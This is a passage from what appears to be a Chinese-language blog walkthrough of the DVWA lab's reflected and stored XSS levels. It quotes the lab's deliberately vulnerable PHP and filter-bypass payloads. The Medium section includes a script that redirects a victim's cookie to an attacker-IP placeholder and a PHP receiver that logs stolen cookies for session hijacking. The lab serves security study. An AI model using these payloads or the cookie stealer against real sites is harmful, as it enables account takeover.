class=\"string\">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;name&#x27;</span> ] );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Feedback for end user</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Medium Reflected XSS Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">header (<span class=\"string\">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Is there any input?</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>( array_key_exists( <span class=\"string\">&quot;name&quot;</span>, <span class=\"variable\">$_GET</span> ) &amp;&amp; <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;name&#x27;</span> ] != <span class=\"literal\">NULL</span> ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Get input</span></span><br><span class=\"line\">    <span class=\"variable\">$name</span> = str_replace( <span class=\"string\">&#x27;&lt;script&gt;&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;name&#x27;</span> ] );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Feedback for end user</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Low Reflected XSS Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">header (<span class=\"string\">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Is there any input?</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>( array_key_exists( <span class=\"string\">&quot;name&quot;</span>, <span class=\"variable\">$_GET</span> ) &amp;&amp; <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;name&#x27;</span> ] != <span class=\"literal\">NULL</span> ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Feedback for end user</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;name&#x27;</span> ] . <span class=\"string\">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"low-11\"><a class=\"markdownIt-Anchor\" href=\"#low-11\">#</a> Low</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;alert(/xss/)&lt;/script&gt; </span><br><span class=\"line\">alert()\t confirm()\tprompt()</span><br></pre></td></tr></table></figure>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210428184310810.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210428184310810\"></p>\n<h3 id=\"medium-11\"><a class=\"markdownIt-Anchor\" href=\"#medium-11\">#</a> Medium</h3>\n<ul>\n<li>嵌套过滤、大小写转换</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;scri&lt;script&gt;pt&gt;</span><br><span class=\"line\">&lt;ScrIpT&gt;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>url 编码</li>\n<li>通过诱导受害人点击页面隐藏提交 name 值，访问攻击网站的 php 脚本获取用户 cookie，从而劫持会话。</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;DOCUMENT.location=&quot;http://攻击IP/cookie.php&quot;&lt;/script&gt;</span><br><span class=\"line\">需要进行url编码</span><br><span class=\"line\">%3Cscript%3EDOCUMENT.location%3D%22http%3A%2F%2FIP%2Fcookie.php%22%3C%2Fscript%3E </span><br></pre></td></tr></table></figure>\n<ul>\n<li>将保存的 cookie 用于登录被攻击账户</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$cookie</span>=<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cookie&#x27;</span>];</span><br><span class=\"line\">file_put_contents(<span class=\"string\">&#x27;cookie.txt&#x27;</span>,<span class=\"variable\">$cookie</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"high-11\"><a class=\"markdownIt-Anchor\" href=\"#high-11\">#</a> High</h3>\n<ul>\n<li>script 被过滤</li>\n<li>使用其他标签</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=<span class=\"string\">&quot;x&quot;</span> onerror=<span class=\"string\">&quot;alert(1)&quot;</span>&gt;</span><br><span class=\"line\"><span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">iframe</span> <span class=\"attr\">onload</span>=<span class=\"string\">alert(1)</span>&gt;</span></span></span><br></pre></td></tr></table></figure>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210428184344293.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210428184344293\"></p>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210428184415013.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210428184415013\"></p>\n<h2 id=\"stored-cross-site-scripting-xss\"><a class=\"markdownIt-Anchor\" href=\"#stored-cross-site-scripting-xss\">#</a> Stored Cross Site Scripting (XSS)</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//Stored XSS</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Impossible Stored XSS Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Check Anti-CSRF token</span></span><br><span class=\"line\">    checkToken( <span class=\"variable\">$_REQUEST</span>[ <span class=\"string\">&#x27;user_token&#x27;</span> ], <span class=\"variable\">$_SESSION</span>[ <span class=\"string\">&#x27;session_token&#x27;</span> ], <span class=\"string\">&#x27;index.php&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Get input</span></span><br><span class=\"line\">    <span class=\"variable\">$message</span> = trim( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class=\"line\">    <span class=\"variable\">$name</span>    = trim( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;txtName&#x27;</span> ] );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Sanitize message input</span></span><br><span class=\"line\">    <span class=\"variable\">$message</span> = stripslashes( <span class=\"variable\">$message</span> );</span><br><span class=\"line\">    <span class=\"variable\">$message</span> = ((<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$message</span> ) : ((trigger_error(<span class=\"string\">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class=\"string\">&quot;&quot;</span> : <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\">    <span class=\"variable\">$message</span> = htmlspecialchars( <span class=\"variable\">$message</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Sanitize name input</span></span><br><span class=\"line\">    <span class=\"variable\">$name</span> = stripslashes( <span class=\"variable\">$name</span> );</span><br><span class=\"line\">    <span class=\"variable\">$name</span> = ((<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$name</span> ) : ((trigger_error(<span class=\"string\">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class=\"string\">&quot;&quot;</span> : <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\">    <span class=\"variable\">$name</span> = htmlspecialchars( <span class=\"variable\">$name</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Update database</span></span><br><span class=\"line\">    <span class=\"variable\">$data</span> = <span class=\"variable\">$db</span>-&gt;prepare( <span class=\"string\">&#x27;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#x27;</span> );</span><br><span class=\"line\">    <span class=\"variable\">$data</span>-&gt;bindParam( <span class=\"string\">&#x27;:message&#x27;</span>, <span class=\"variable\">$message</span>, PDO::PARAM_STR );</span><br><span class=\"line\">    <span class=\"variable\">$data</span>-&gt;bindParam( <span class=\"string\">&#x27;:name&#x27;</span>, <span class=\"variable\">$name</span>, PDO::PARAM_STR );</span><br><span class=\"line\">    <span class=\"variable\">$data</span>-&gt;execute();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Generate Anti-CSRF token</span></span><br><span class=\"line\">generateSessionToken();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//High Stored XSS Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Get input</span></span><br><span class=\"line\">    <span class=\"variable\">$message</span> = trim( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class=\"line\">    <span class=\"variable\">$name</span>    = trim( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;txtName&#x27;</span> ] );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Sanitize message input</span></span><br><span class=\"line\">    <span class=\"variable\">$message</span> = strip_tags( addslashes( <span class=\"variable\">$message</span> ) );</span><br><span class=\"line\">    <span class=\"variable\">$message</span> = ((<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$message</span> ) : ((trigger_error(<span class=\"string\">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class=\"string\">&quot;&quot;</span> : <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\">    <span class=\"variable\">$message</span> = htmlspecialchars( <span class=\"variable\">$message</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Sanitize name input</span></span><br><span class=\"line\">    <span class=\"variable\">$name</span> = preg_replace( <span class=\"string\">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$name</span> );</span><br><span class=\"line\">    <span class=\"variable\">$name</span> = ((<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$name</span> ) : ((trigger_error(<span class=\"string\">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class=\"string\">&quot;&quot;</span> : <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Update database</span></span><br><span class=\"line\">    <span class=\"variable\">$query</span>  = <span class=\"string\">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class=\"subst\">$message</span>&#x27;, &#x27;<span class=\"subst\">$name</span>&#x27; );&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = mysqli_query(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$query</span> ) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>( <span class=\"string\">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) : ((<span class=\"variable\">$___mysqli_res</span> = mysqli_connect_error()) ? <span class=\"variable\">$___mysqli_res</span> : <span class=\"literal\">false</span>)) . <span class=\"string\">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//mysql_close();</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Medium Stored XSS Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Get input</span></span><br><span class=\"line\">    <span class=\"variable\">$message</span> = trim( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class=\"line\">    <span class=\"variable\">$name</span>    = trim( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;txtName&#x27;</span> ] );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Sanitize message input</span></span><br><span class=\"line\">    <span class=\"variable\">$message</span> = strip_tags( addslashes( <span class=\"variable\">$message</span> ) );</span><br><span class=\"line\">    <span class=\"variable\">$message</span> = ((<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$message</span> ) : ((trigger_error(<span class=\"string\">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class=\"string\">&quot;&quot;</span> : <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\">    <span class=\"variable\">$message</span> = htmlspecialchars( <span class=\"variable\">$message</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Sanitize name input</span></span><br><span class=\"line\">    <span class=\"variable\">$name</span> = str_replace( <span class=\"string\">&#x27;&lt;script&gt;&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$name</span> );</span><br><span class=\"line\">    <span class=\"variable\">$name</span> = ((<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$name</span> ) : ((trigger_error(<span class=\"string\">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class=\"string\">&quot;&quot;</span> : <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Update database</span></span><br><span class=\"line\">    <span class=\"variable\">$query</span>  = <span class=\"string\">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class=\"subst\">$message</span>&#x27;, &#x27;<span class=\"subst\">$name</span>&#x27; );&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = mysqli_query(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$query</span> ) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>( <span class=\"string\">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) : ((<span class=\"variable\">$___mysqli_res</span> = mysqli_connect_error()) ? <span class=\"variable\">$___mysqli_res</span> : <span class=\"literal\">false</span>)) . <span class=\"string\">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//mysql_close();</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Low Stored XSS Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Get input</span></span><br><span class=\"line\">    <span class=\"variable\">$message</span> = trim( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class=\"line\">    <span class=\"variable\">$name</span>    = trim( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;txtName&#x27;</span> ] );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Sanitize message input</span></span><br><span class=\"line\">    <span class=\"variable\">$message</span> = stripslashes( <span class=\"variable\">$message</span> );</span><br><span class=\"line\">    <span class=\"variable\">$message</span> = ((<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$message</span> ) : ((trigger_error(<span class=\"string\">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class=\"string\">&quot;&quot;</span> : <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Sanitize name input</span></span><br><span class=\"line\">    <span class=\"variable\">$name</span> = ((<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$name</span> ) : ((trigger_error(<span class=\"string\">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class=\"string\">&quot;&quot;</span> : <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Update database</span></span><br><span class=\"line\">    <span class=\"variable\">$query</span>  = <span class=\"string\">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class=\"subst\">$message</span>&#x27;, &#x27;<span class=\"subst\">$name</span>&#x27; );&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = mysqli_query(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$query</span> ) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>( <span class=\"string\">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) : ((<span class=\"variable\">$___mysqli_res</span> = mysqli_connect_error()) ? <span class=\"variable\">$___mysqli_res</span> : <span class=\"literal\">false</span>)) . <span class=\"string\">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//mysql_close();</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"low-12\"><a class=\"markdownIt-Anchor\" href=\"#low-12\">#</a> Low</h3>\n<ul>\n<li>与反射形类似</li>\n</ul>\n<h3 id=\"medium-12\"><a class=\"markdownIt-Anchor\" href=\"#medium-12\">#</a> Medium</h3>\n<ul>\n<li>与反射形类似</li>\n</ul>\n<h3 id=\"high-12\"><a class=\"markdownIt-Anchor\" href=\"#high-12\">#</a> High</h3>\n<ul>\n<li>与反射形类似</li>\n</ul>\n",
            "tags": [
                "安全"
            ]
        }
    ]
}